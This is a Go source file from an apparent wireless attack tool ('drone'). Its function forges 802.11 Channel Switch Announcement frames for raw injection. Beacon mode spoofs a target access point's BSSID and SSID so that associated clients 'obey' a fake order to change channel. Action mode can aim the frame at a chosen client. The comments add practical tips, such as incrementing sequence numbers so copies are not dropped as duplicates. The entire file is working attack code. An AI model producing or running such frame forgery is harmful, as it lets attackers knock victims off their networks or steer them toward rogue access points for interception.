package drone

import (
	"encoding/hex"
	"fmt"
	"net"
)

// 802.11 element IDs used by the channel switch builder.
const (
	ieSSID          = 0
	ieSupportedRate = 1
	ieDSParams      = 3
	ieCSA           = 37
)

// CSAMode selects the frame that carries the announcement.
type CSAMode int

const (
	// CSAModeBeacon mimics the AP's own beacon with a CSA element appended.
	// Clients obey it because it looks like the AP they are associated with;
	// this is the form aireplay-ng/mdk4 send in practice.
	CSAModeBeacon CSAMode = iota

	// CSAModeAction sends a Spectrum Management action frame, the form the
	// standard defines. Broadcast action frames are widely ignored, so prefer
	// a unicast client MAC.
	CSAModeAction
)

// String returns the CLI spelling of the mode.
func (m CSAMode) String() string {
	if m == CSAModeAction {
		return "action"
	}
	return "beacon"
}

// ParseCSAMode maps the CLI spelling to a CSAMode.
func ParseCSAMode(s string) (CSAMode, error) {
	switch s {
	case "", "beacon":
		return CSAModeBeacon, nil
	case "action":
		return CSAModeAction, nil
	default:
		return CSAModeBeacon, fmt.Errorf("unknown CSA mode %q (beacon or action)", s)
	}
}

// CSAParams describes one Channel Switch Announcement.
type CSAParams struct {
	BSSID         string
	SSID          string
	TargetChannel int
	// Count is how many beacon intervals the AP claims it will keep announcing
	// before the switch (1..255). Clients use it to schedule the move.
	Count int
	// Seq is the 802.11 sequence number. Reusing a single number makes clients
	// discard the copies as duplicates, so callers should increment it.
	Seq uint16
	// Client is Addr1 for an action frame. Empty or broadcast means broadcast;
	// beacon mode is always broadcast.
	Client  string
	Mode    CSAMode
	Options FrameOptions
}

// BuildCSAFrame renders one Channel Switch Announcement wrapped in a RadioTap
// header, ready for SEND_INJECTION.
//
// Beacon form (the one clients act on):
//
//	Frame Control 0x0080, Addr1 broadcast, Addr2/Addr3 the AP BSSID
//	Fixed: timestamp 0, beacon interval 100 TU, capability ESS|Privacy|ShortPreamble|ShortSlot
//	IEs: SSID, Supported Rates, DS Parameter (current channel), CSA (37)
//
// Action form:
//
//	Frame Control 0x00d0, Addr1 client/broadcast, Addr2/Addr3 the AP BSSID
//	Body: category 0 (Spectrum Management), action 4 (CSA), CSA element
//
// The CSA element is id 37, length 3: mode 0 (no transmission restriction),
// the new channel, and the countdown.
func BuildCSAFrame(p CSAParams) (string, error) {
	bssid, err := net.ParseMAC(p.BSSID)
	if err != nil {
		return "", fmt.Errorf("invalid BSSID MAC: %w", err)
	}
	if p.TargetChannel < 1 || p.TargetChannel > 13 {
		return "", fmt.Errorf("target channel %d is outside 1-13", p.TargetChannel)
	}

	ssid := []byte(p.SSID)
	if len(ssid) > 32 {
		return "", fmt.Errorf("SSID is %d bytes; 802.11 allows at most 32", len(ssid))
	}

	count := p.Count
	if count < 1 {
		count = 1
	}
	if count > 255 {
		count = 255
	}

	csa := []byte{ieCSA, 3, 0x00, byte(p.TargetChannel), byte(count)}

	var (
		fc    byte
		addr1 net.HardwareAddr
		body  []byte
	)

	switch p.Mode {
	case CSAModeAction:
		fc = 0xd0 // Action
		if p.Client == "" || p.Client == "ff:ff:ff:ff:ff:ff" {
			addr1 = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
		} else {
			addr1, err = net.ParseMAC(p.Client)
			if err != nil {
				return "", fmt.Errorf("invalid client MAC: %w", err)
			}
		}
		// Category 0 = Spectrum Management, action 4 = Channel Switch
		// Announcement, followed by the CSA element.
		body = append([]byte{0x00, 0x04}, csa...)

	default:
		fc = 0x80 // Beacon
		addr1 = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

		body = make([]byte, 0, 12+2+len(ssid)+6+3+len(csa))
		body = append(body, 0, 0, 0, 0, 0, 0, 0, 0) // timestamp
		body = append(body, 0x64, 0x00)             // beacon interval: 100 TU
		// Capability: ESS | Privacy | Short Preamble | Short Slot Time. An AP
		// that is a WPA2 PSK network advertises privacy; clients that are
		// associated already know the real value.
		body = append(body, 0x31, 0x04)

		body = append(body, ieSSID, byte(len(ssid)))
		body = append(body, ssid...)
		body = append(body, ieSupportedRate, 4, 0x82, 0x84, 0x8b, 0x96)
		body = append(body, ieDSParams, 1,
			byte(normalizeChannel(p.Options.Channel)))
		body = append(body, csa...)
	}

	frame := make([]byte, 0, 16+24+len(body))
	frame = append(frame, radiotapHeader(p.Options.Channel, p.Options.RateMbps)...)
	frame = append(frame, mgmtHeader(fc, addr1, bssid, bssid, p.Seq)...)
	frame = append(frame, body...)

	return hex.EncodeToString(frame), nil
}
